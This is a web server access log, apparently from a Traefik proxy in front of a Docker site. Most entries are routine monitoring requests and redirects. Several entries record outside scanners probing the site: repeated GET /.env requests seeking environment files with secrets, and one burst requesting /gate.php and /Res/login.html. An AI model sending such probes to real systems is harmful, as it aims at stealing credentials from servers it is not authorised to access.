143.110.222.166 - - [16/Dec/2023:14:06:10 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2435 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2436 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2437 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2438 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2439 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2440 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2441 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:14:09:10 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2442 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2443 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2444 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2445 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2446 "www@docker" "http://172.29.0.8:80" 0ms
51.159.164.227 - - [16/Dec/2023:14:10:46 +0000] "HEAD / HTTP/1.1" 308 18 "-" "-" 2447 "web-to-websecure@internal" "-" 0ms
51.159.164.227 - - [16/Dec/2023:14:10:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2448 "web-to-websecure@internal" "-" 0ms
51.159.164.227 - - [16/Dec/2023:14:10:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2449 "-" "-" 0ms
51.159.164.227 - - [16/Dec/2023:14:10:47 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2450 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2451 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2452 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2453 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2454 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2455 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2456 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2457 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2458 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2459 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2460 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2461 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2462 "www@docker" "http://172.29.0.8:80" 0ms
54.37.79.75 - - [16/Dec/2023:14:16:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2463 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [16/Dec/2023:14:16:48 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2464 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2465 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2466 "www@docker" "http://172.29.0.8:80" 0ms
95.214.235.169 - - [16/Dec/2023:14:18:03 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2467 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [16/Dec/2023:14:18:03 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2468 "web-to-websecure@internal" "-" 0ms
45.142.182.77 - - [16/Dec/2023:14:18:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2469 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2470 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2471 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2472 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2473 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2474 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2475 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2476 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2477 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2478 "www@docker" "http://172.29.0.8:80" 0ms
167.248.133.53 - - [16/Dec/2023:14:22:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2479 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:14:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2480 "www@docker" "http://172.29.0.8:80" 1ms
167.248.133.53 - - [16/Dec/2023:14:22:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2481 "web-to-websecure@internal" "-" 0ms
167.248.133.53 - - [16/Dec/2023:14:22:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2482 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2483 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2484 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2485 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2486 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2487 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2488 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2489 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2490 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2491 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2492 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2493 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2494 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2495 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2496 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2497 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2498 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2499 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2500 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2501 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2502 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2503 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2504 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2505 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2506 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2507 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2508 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2509 "www@docker" "http://172.29.0.8:80" 0ms
95.214.235.169 - - [16/Dec/2023:14:36:33 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2510 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [16/Dec/2023:14:36:33 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2511 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:14:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2512 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2513 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2514 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2515 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2516 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2517 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2518 "www@docker" "http://172.29.0.8:80" 0ms
167.94.146.60 - - [16/Dec/2023:14:39:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2519 "-" "-" 0ms
167.94.146.60 - - [16/Dec/2023:14:39:57 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2520 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2521 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2522 "www@docker" "http://172.29.0.8:80" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /%25 HTTP/1.1" 404 19 "-" "-" 2523 "-" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /gate.php HTTP/1.1" 301 17 "-" "-" 2524 "web-to-websecure@internal" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2525 "web-to-websecure@internal" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /robots.txt HTTP/1.1" 301 17 "-" "-" 2526 "web-to-websecure@internal" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /99vt HTTP/1.1" 301 17 "-" "-" 2527 "web-to-websecure@internal" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1" 301 17 "-" "-" 2528 "web-to-websecure@internal" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /robots.txt HTTP/1.1" 301 17 "-" "-" 2529 "web-to-websecure@internal" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /Res/login.html HTTP/1.1" 404 19 "-" "-" 2530 "-" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1" 404 19 "-" "-" 2531 "-" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2532 "-" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /99vt HTTP/1.1" 404 19 "-" "-" 2533 "-" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2534 "-" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2535 "-" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:01 +0000] "GET /99vu HTTP/1.1" 301 17 "-" "-" 2536 "web-to-websecure@internal" "-" 0ms
3.235.190.29 - - [16/Dec/2023:14:41:02 +0000] "GET /99vu HTTP/1.1" 404 19 "-" "-" 2537 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2538 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2539 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2540 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2541 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2542 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2543 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2544 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2545 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2546 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2547 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2548 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2549 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2550 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2551 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2552 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2553 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2554 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:14:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2555 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2556 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2557 "www@docker" "http://172.29.0.8:80" 0ms
54.37.79.75 - - [16/Dec/2023:14:51:10 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2558 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [16/Dec/2023:14:51:10 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2559 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:14:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2560 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2561 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2562 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2563 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2564 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2565 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2566 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2567 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2568 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2569 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2570 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2571 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2572 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2573 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:14:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2574 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2575 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:14:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2576 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:14:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2577 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2578 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2579 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2580 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2581 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2582 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2583 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2584 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2585 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2586 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2587 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2588 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2589 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2590 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2591 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2592 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2593 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2594 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2595 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:15:09:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2596 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2597 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2598 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2599 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2600 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2601 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2602 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2603 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2604 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2605 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2606 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2607 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2608 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2609 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2610 "www@docker" "http://172.29.0.8:80" 1ms
54.37.79.75 - - [16/Dec/2023:15:16:11 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2611 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [16/Dec/2023:15:16:11 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2612 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2613 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2614 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2615 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2616 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2617 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2618 "www@docker" "http://172.29.0.8:80" 0ms
